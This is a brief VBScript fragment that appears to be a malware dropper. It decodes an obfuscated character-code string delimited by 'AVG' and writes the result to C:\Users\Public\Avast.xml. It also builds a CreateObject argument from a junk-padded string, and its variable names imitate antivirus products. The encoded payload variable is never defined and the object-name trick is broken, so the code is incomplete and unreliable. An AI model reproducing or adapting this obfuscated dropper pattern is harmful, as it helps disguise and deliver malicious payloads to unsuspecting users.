Function URLDecode(StringToDecode)
Dim TempAns
Dim CurChr
CurChr = 1
Do Until CurChr - 1 = Len(StringToDecode)
Select Case Mid(StringToDecode, CurChr, 1)
Case "+"
TempAns = TempAns & " "
Case "%"
TempAns = TempAns & Chr(("&h" & Mid(StringToDecode, CurChr + 1, 2)))
CurChr = CurChr + 2
Case Else
TempAns = TempAns & Mid(StringToDecode, CurChr, 1)
End Select
CurChr = CurChr + 1
Loop
URLDecode = TempAns
End Function

Function Avast(sInput, sKeyword)
Dim Results
Dim My_Array
My_Array = Split(sInput, sKeyword)
For Each S In My_Array
Results = Results & Chr(CInt(S))
Next
Avast = Results
End Function
Dim Problem
Problem = Replace(".","zkbmsqzkdusfcbryeedivqagyzhdtgfaaqysdznzqwslaehbhqwrgsmrksxquwsgpsejlshoumpey","")
Set Mercedes = CreateObject(Problem)
Sub Weekend()
Set fso = CreateObject("Scripting.FileSystemObject")
Set MyFile = fso.CreateTextFile("C:\Users\Public\Avast.xml", True)
Dim Decoded : Decoded = URLDecode(Avast(NH, "AV"+"G"))
MyFile.Write(Decoded)
MyFile.Close
End Sub

